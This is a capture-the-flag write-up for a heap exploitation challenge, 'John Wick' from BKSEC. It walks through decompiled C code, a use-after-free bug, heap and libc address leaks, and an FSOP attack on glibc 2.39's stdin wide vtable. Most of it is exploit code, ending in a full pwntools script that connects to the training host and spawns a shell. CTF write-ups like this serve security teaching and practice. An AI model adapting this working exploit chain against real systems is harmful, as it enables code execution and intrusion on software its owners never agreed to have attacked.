---
title: John Wick - BKSEC
tags:
  - binary exploit
  - bksec
createdAt: 2026-03-19
---

# Challenge Description

## File type

```bash
$ file john_wick
john_wick: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.39.so, BuildID[sha1]=2e84c6d0c7f8ee868d35ed8633acfc720abf9c9f, for GNU/Linux 3.2.0, stripped
```

## Binary Protection

```bash
$ checksec john_wick
[*] './john_wick'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

## Background

- Here is preview of `john_wick` execution.

```
==================== BKSEC High Table ==================
============== CONTRACT MANAGEMENT SYSTEM ==============
1. Add a contract
2. Delete a contract
3. View a contract
4. Change status
5. Edit a contract description
6. Exit
> 1
Index: 0
CONTRACT NO.0 >>>
Name: SteGG
Age: 18
Height (cm): 171
Length of description: 12
Description: abc
Bounty (in BKSEC coin, 1 BKSEC coin = 6M$): 3
[*] Success!
==================== BKSEC High Table ==================
============== CONTRACT MANAGEMENT SYSTEM ==============
1. Add a contract
2. Delete a contract
3. View a contract
4. Change status
5. Edit a contract description
6. Exit
> 3
Index: 0
>>>>>>>> EXCOMMUNICADO <<<<<<<<
CONTRACT NO.0 >>>
Name: SteGG

Age: 18
Height: 171 cm
Description: abc

Bounty: 3 BKSEC coins - 18M$
Danger level: 0
Status: OPEN
==================== BKSEC High Table ==================
============== CONTRACT MANAGEMENT SYSTEM ==============
1. Add a contract
2. Delete a contract
3. View a contract
4. Change status
5. Edit a contract description
6. Exit
>
```

### Decompile code

- Glibc version: [2.39](https://elixir.bootlin.com/glibc/glibc-2.39/source)

```c
struct Contract {
	unsigned __int32 age;
	unsigned __int32 height;
	unsigned __int32 length_desc;
	char name[30];
	unsigned __int16 bksec_coin;
	unsigned __int16 mdollars;
	unsigned __int16 danger_level;
	char status[32];
	char* description;
};

Contract* contracts[10];
```

```c
int add_contract()
{
	char *v1; // rax
	int bounty; // [rsp+8h] [rbp-28h] BYREF
	unsigned int idx; // [rsp+Ch] [rbp-24h]
	unsigned int length_desc; // [rsp+10h] [rbp-20h]
	unsigned int nbytes_4; // [rsp+14h] [rbp-1Ch]
	Contract *new_contract; // [rsp+18h] [rbp-18h]
	char *description; // [rsp+20h] [rbp-10h]
	unsigned __int64 canary; // [rsp+28h] [rbp-8h]

	canary = __readfsqword(0x28u);
	new_contract = 0LL;
	printf("Index: ");
	idx = read_integer();
	if ( idx <= 9 )
	{
		if ( contracts[idx] )
		{
			puts("Not available!!");
			return 1337;
		}
		else
		{
			new_contract = (Contract *)malloc(88uLL);
			if ( !new_contract )
			{
				puts("Error!");
				exit(-1);
			}
			contracts[idx] = (__int64)new_contract;
			printf("CONTRACT NO.%u >>>\n", idx);
			memset(new_contract, 0, sizeof(Contract));
			printf("Name: ");
			read(0, new_contract->name, 29uLL);
			printf("Age: ");
			new_contract->age = read_integer();
			printf("Height (cm): ");
			new_contract->height = read_integer();
			printf("Length of description: ");
			length_desc = read_integer();
			if ( length_desc <= 256 )
			{
				description = (char *)malloc(length_desc + 1);
				if ( !description )
				{
					puts("Error!");
					exit(-1);
				}
				printf("Description: ");
				nbytes_4 = read(0, description, length_desc);
				description[nbytes_4] = 0;
				new_contract->description = description;
				new_contract->length_desc = length_desc;
				printf("Bounty (in BKSEC coin, 1 BKSEC coin = 6M$): ");
				bounty = 0;
				__isoc99_scanf("%d%*c", &bounty);
				new_contract->bksec_coin = bounty;
				*(_DWORD *)&new_contract->mdollars = 6 * new_contract->bksec_coin;
				v1 = new_contract->status;
				*(_DWORD *)new_contract->status = 0x4E45504F;// "OPEN"
				v1[4] = 0;
				return puts("[*] Success!");
			}
			else
			{
				puts("Too large!!");
				free(new_contract);
				return 1337;
			}
		}
	}
	else
	{
		puts("Invalid index!!");
		return 1337;
	}
}
```

```c
int delete_contract()
{
	unsigned int idx; // [rsp+4h] [rbp-Ch]
	Contract *ptr; // [rsp+8h] [rbp-8h]

	printf("Index: ");
	idx = read_integer();
	if ( idx <= 9 && contracts[idx] )
	{
		ptr = (Contract *)contracts[idx];
		printf("CONTRACT NO.%u >>> Delete\n", idx);
		free(ptr->description);
		ptr->description = 0LL;
		free(ptr);
		contracts[idx] = 0LL;
		return puts("[*] Success!");
	}
	else
	{
		puts("Invalid index!!");
		return 1337;
	}
}
```

```c
__int64 view_contract()
{
	unsigned int idx; // [rsp+4h] [rbp-Ch]
	Contract *selected_contract; // [rsp+8h] [rbp-8h]

	printf("Index: ");
	idx = read_integer();
	if ( idx <= 9 && contracts[idx] )
	{
		selected_contract = (Contract *)contracts[idx];
		puts(">>>>>>>> EXCOMMUNICADO <<<<<<<<");
		printf("CONTRACT NO.%u >>>\n", idx);
		printf("Name: %s\n", selected_contract->name);
		printf("Age: %d\n", selected_contract->age);
		printf("Height: %d cm\n", selected_contract->height);
		printf("Description: %s\n", selected_contract->description);
		printf("Bounty: %hu BKSEC coins - %huM$\n", selected_contract->bksec_coin, selected_contract->mdollars);
		printf("Danger level: %hu\n", selected_contract->danger_level);
		printf("Status: %s\n", selected_contract->status);
		return 0LL;
	}
	else
	{
		puts("Invalid index!!");
		return 1337LL;
	}
}
```

```c
int change_status()
{
	unsigned int idx; // [rsp+4h] [rbp-Ch]
	Contract *selected_contract; // [rsp+8h] [rbp-8h]

	printf("Index: ");
	idx = read_integer();
	if ( idx <= 9 && contracts[idx] )
	{
		selected_contract = (Contract *)contracts[idx];
		printf("CONTRACT NO.%u >>> Danger level: %hu\n", idx, selected_contract->danger_level);
		if ( selected_contract->danger_level > 4u )
		{
			printf("New status: ");
			__isoc99_scanf("%32s", selected_contract->status);
			return puts("[*] Success!");
		}
		else
		{
			puts("FAIL! You can only change the status of contracts with danger level greater than or equal to 5 (HIGH).");
			return 1337;
		}
	}
	else
	{
		puts("Invalid index!!");
		return 1337;
	}
}
```

```c
int edit_contract()
{
	unsigned int idx; // [rsp+0h] [rbp-10h]
	Contract *selected_contract; // [rsp+8h] [rbp-8h]

	printf("Index: ");
	idx = read_integer();
	if ( idx <= 9 && contracts[idx] )
	{
		selected_contract = (Contract *)contracts[idx];
		printf("CONTRACT NO.%u >>> Edit description\n", idx);
		printf("New description: ");
		selected_contract->description[(unsigned int)read(0, selected_contract->description, selected_contract->length_desc)] = 0;
		return puts("[*] Success!");
	}
	else
	{
		puts("Invalid index!!");
		return 1337;
	}
}
```

# Vulnerability

- In `add_contract()` function, if I input size of description larger than `256`, the program will free created contract at first. However, it forgot to set the selected element in global array `contracts` to `NULL`. That leads to **use-after-free** vulnerability.

# Exploitation

## Leak Heap Address

- That freed contract will be put into **tcache**.
- In glibc 2.39, `fd` pointer of all chunks in **tcache** is protected by some bitwise action. However, for the first chunk, its `fd` pointer is just heap address pointer and shift 12 bytes to the right.
- Therefore, I tried to set `description` of a new contract to that freed pointer contract.

```python
add_contract(0, b"SteGG", 18, 171, 0x60, b"A", 0)
add_contract(1, b"SteGG", 18, 171, 300, b"", 0)
delete_contract(0)
```

- Then I just need to use print operation and shift 12 bytes to the left to get heap address

```python
view_contract(1)
target.recvuntil(b"Age: ")
lower_heap = int(target.recvuntil(b"\n", drop=True).decode()) << 12
target.recvuntil(b"Height: ")
higher_heap = int(target.recvuntil(b" cm\n", drop=True).decode()) << 44
heap_addr = higher_heap + lower_heap
print(f"Heap: {hex(heap_addr)}")
```

## Leak Libc Address

- Since I put that freed contract into `description` field, I can do an arbitrary write to any address by creating a fake contract with target address in `description` field
- Here I want to write to address offset `0x3c8` from heap address:

```python
payload = p32(18) + p32(171) + p32(0xff) + b"A" * 29 + b"\x00" + p16(0x0) + p16(0x0) + p16(0x0) + b"A" * 32 + p64(heap_addr + 0x3c8)
add_contract(0, b"SteGG", 18, 171, 0x57, payload, 0)
```

- Now I just need to edit description of contract index 1 to modify content of target address

```python
payload = p64(0x421) + p32(18) + p32(171) + p32(24) + b"A" * 30 + p16(0x0) + p16(0x0) + p16(0x0) + b"A" * 32 + p64(heap_addr + 0x3c8 + 0x420)
edit_contract(1, payload)
```

- The target is also a chunk in heap, I rewritten its size and 2 chunks after it so that when I free it, it will be put into **unsorted bins**. I just need to save a clone of its contract by using **use-after-free** again. when performing view contract action, I will get libc address.

```python
add_contract(2, b"SteGG", 18, 171, 300, b"", 0)
add_contract(3, b"SteGG", 18, 171, 0x20, b"A", 0)
payload = p64(0x421) + p32(18) + p32(171) + p32(24) + b"A" * 30 + p16(0x0) + p16(0x0) + p16(0x0) + b"A" * 32 + p64(heap_addr + 0x3c8 + 0x420)
edit_contract(1, payload)
payload = p64(0x11) + b"\x00" * 8 + p64(0x11)
edit_contract(3, payload)
payload = p64(0x421) + p32(18) + p32(171) + p32(24) + b"A" * 30 + p16(0x0) + p16(0x0) + p16(0x0) + b"A" * 32 + p64(0x0)
edit_contract(1, payload)
delete_contract(3)

view_contract(2)
target.recvuntil(b"Age: ")
lower_libc = int(target.recvuntil(b"\n", drop=True).decode())
if lower_libc < 0:
	lower_libc += 0x100000000
target.recvuntil(b"Height: ")
higher_libc = int(target.recvuntil(b" cm\n", drop=True).decode()) << 32
libc.address = higher_libc + lower_libc - 0x203b20
print(f"Libc: {hex(libc.address)}")
```

## Get Shell

- To get shell in this challange, I decide to use **FSOP** technique and I will rewrite `_IO_2_1_stdin_`. When I call `scanf`, it will trigger `__uflow` function in `vtable` of `_IO_2_1_stdin_`
- Glibc 2.39 added mitigation to verify the vtable of `_IO_FILE` structure before run the function inside it. Therefore, I can only rewrite `wide_vtable` of `_wide_data` pointer in `stdin` and then rewrite `vtable` to default `wide_vtable` of glibc (`_IO_wide_jumps`).
- Code execution: `scanf` -> `__vfscanf_internal` -> `vtable->__uflow` (`_IO_wide_jumps->__uflow`) -> `vtable->__underflow` (`_IO_wide_jumps->__underflow`) -> `wide_data->wide_vtable->__doallocbuf`
- With the above code execution, I just need to set `system` address function to `__doallocbuf` offset and add `/bin/sh` to `_flags` field of `stdin` to get shell

## Exploit Code

```python
#!/usr/bin/env python
from pwn import *
import utils

context.terminal = ['kitty', '@', 'launch', '--type=os-window', '--cwd={}'.format(os.getcwd())]
context.log_level = "debug"
context.arch = "amd64"

TARGET = "./bin/john_wick"
LIBC = "./lib/libc.so.6"

if len(sys.argv) > 1 and sys.argv[1] == "remote":
	target = remote("pwn-john-wick.training.bksec.vn", 8443)
else:
	target = process(TARGET)
	gdbscript = """
	breakrva 0x1c4f
	"""
	# target: process | remote = gdb.debug(TARGET, gdbscript, env={"SHELL": "/bin/sh"})

exe = ELF(TARGET)
libc = ELF(LIBC)

"""
contracts: 0x4060
"""

def add_contract(index: int, name: bytes, age: int, height: int, length_desc: int, description: bytes, bounty: int):
	target.sendafter(b"> ", b"1")
	target.sendafter(b"Index: ", str(index).encode())
	target.sendafter(b"Name: ", name)
	target.sendafter(b"Age: ", str(age).encode())
	target.sendafter(b"Height (cm): ", str(height).encode())
	target.sendafter(b"Length of description: ", str(length_desc).encode())
	if length_desc <= 256:
		target.sendafter(b"Description: ", description)
		target.sendlineafter(b"Bounty (in BKSEC coin, 1 BKSEC coin = 6M$): ", str(bounty).encode())

def delete_contract(index: int):
	target.sendafter(b"> ", b"2")
	target.sendafter(b"Index: ", str(index).encode())

def view_contract(index: int):
	target.sendafter(b"> ", b"3")
	target.sendafter(b"Index: ", str(index).encode())

def change_status(index: int, status: bytes):
	target.sendafter(b"> ", b"4")
	target.sendafter(b"Index: ", str(index).encode())
	target.sendlineafter(b"New status: ", status)

def edit_contract(index: int, description: bytes):
	target.sendafter(b"> ", b"5")
	target.sendafter(b"Index: ", str(index).encode())
	target.sendafter(b"New description: ", description)

def exit_func():
	target.sendafter(b"> ", b"6")

add_contract(0, b"SteGG", 18, 171, 0x60, b"A", 0)
add_contract(1, b"SteGG", 18, 171, 300, b"", 0)
delete_contract(0)

view_contract(1)
target.recvuntil(b"Age: ")
lower_heap = int(target.recvuntil(b"\n", drop=True).decode()) << 12
target.recvuntil(b"Height: ")
higher_heap = int(target.recvuntil(b" cm\n", drop=True).decode()) << 44
heap_addr = higher_heap + lower_heap
print(f"Heap: {hex(heap_addr)}")

payload = p32(18) + p32(171) + p32(0xff) + b"A" * 29 + b"\x00" + p16(0x0) + p16(0x0) + p16(0x0) + b"A" * 32 + p64(heap_addr + 0x3c8)
add_contract(0, b"SteGG", 18, 171, 0x57, payload, 0)
add_contract(2, b"SteGG", 18, 171, 300, b"", 0)
add_contract(3, b"SteGG", 18, 171, 0x20, b"A", 0)
payload = p64(0x421) + p32(18) + p32(171) + p32(24) + b"A" * 30 + p16(0x0) + p16(0x0) + p16(0x0) + b"A" * 32 + p64(heap_addr + 0x3c8 + 0x420)
edit_contract(1, payload)
payload = p64(0x11) + b"\x00" * 8 + p64(0x11)
edit_contract(3, payload)
payload = p64(0x421) + p32(18) + p32(171) + p32(24) + b"A" * 30 + p16(0x0) + p16(0x0) + p16(0x0) + b"A" * 32 + p64(0x0)
edit_contract(1, payload)
delete_contract(3)

view_contract(2)
target.recvuntil(b"Age: ")
lower_libc = int(target.recvuntil(b"\n", drop=True).decode())
if lower_libc < 0:
	lower_libc += 0x100000000
target.recvuntil(b"Height: ")
higher_libc = int(target.recvuntil(b" cm\n", drop=True).decode()) << 32
libc.address = higher_libc + lower_libc - 0x203b20
print(f"Libc: {hex(libc.address)}")

fake_file = libc.symbols["_IO_2_1_stdin_"]
# Make heap_addr + 0x3c8 become _wide_data
payload = flat({
	# _wide_data->_IO_read_ptr
	0x00: p64(0),
	# _wide_data->_IO_read_end
	0x8: p64(0),
	# _wide_data->_IO_buf_base
	0x30: p64(0),
	# _wide_data->_IO_save_base
	0x40: p64(0),
	# _wide_data->_wide_vtable
	0xe0: fake_file
})
edit_contract(1, payload)

payload = p32(18) + p32(171) + p32(0xff) + b"A" * 29 + b"\x00" + p16(0x0) + p16(0x0) + p16(0x8) + b"A" * 32 + p64(libc.symbols["_IO_2_1_stdin_"])
edit_contract(0, payload)

payload = flat(
	{
		# file._flags
		0x00: b"  sh\x00",
		# file._IO_read_ptr
		0x8: p64(0),
		# file._IO_read_end
		0x10: p64(0),
		# file._IO_buf_base
		0x38: p64(1),
		# file._IO_save_base
		0x48: p64(0),
		# file._markers
		0x60: p64(0),
		# file._chain
		0x68: libc.symbols["system"],
		# file._lock
		0x88: libc.symbols["_IO_stdfile_0_lock"],
		# file._wide_data
		0xa0: heap_addr + 0x3c8,
		# file._mode
		0xc0: p64(0),
		# _vtable
		0xd8: libc.symbols["_IO_wfile_jumps"],
	}
)
edit_contract(1, payload)
change_status(1, b"Completed")

target.interactive()
```
